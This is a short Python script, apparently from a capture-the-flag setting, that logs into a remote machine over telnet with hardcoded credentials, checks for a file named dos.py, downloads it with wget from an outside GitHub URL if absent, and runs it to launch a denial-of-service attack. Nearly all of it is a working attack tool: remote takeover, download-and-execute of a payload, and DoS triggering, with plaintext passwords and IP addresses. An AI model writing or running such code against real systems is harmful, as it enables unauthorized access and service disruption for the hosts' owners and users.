import telnetlib
import time
import re
class Trigger(object):
    def __init__(self):
        pass

    def login(self,Host,user_name,password):
        dev = telnetlib.Telnet(Host,port=23)
        dev.set_debuglevel(2) #Debug mode

        dev.read_until(b'login:')
        dev.write(user_name + b'\n')

        dev.read_until(b'Password:')
        dev.write(password + b'\n')
        dev.read_until(b'$')
        return dev

    def checkIN(self,dev):
        fileisIN = False
        dev.write(b'ls'+b'\n')
        buff = dev.read_until(b'$')
        buff = str(buff,encoding='utf-8')
        matched = re.search(r'\bdos.py\b', buff, re.M)
        if matched:
            fileisIN = True
        return fileisIN

    def dosDownLoad(self,dev,path):
        dev.write(b'cd ~' + b'\n')

        dev.read_until(b'$')
        dev.write(b'wget '+ path + b'\n')
        dev.read_until(b'$')

    def dosAction(self,dev):
        dev.write(b'python3 dos.py' + b'\n')
        dev.read_until(b'$')

    def signout(self,dev):
        telnetlib.Telnet.close(dev)

if __name__ == '__main__':
    Host_ctrled=b'153.0.0.181'
    username = b'ctf'
    passwd = b'test1234'

    Host_attack=b'153.0.0.171'
    user = b'ctf'
    pawd = b'ctff1234'

    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/dos/dos.py'
    hack = Trigger()
    dev = hack.login(Host_ctrled,username,passwd)
    #dev = hack.login(Host_attack,user,pawd)
    if not hack.checkIN(dev):
        hack.dosDownLoad(dev,path)
    time.sleep(2)
    hack.dosAction(dev)
    hack.signout(dev)


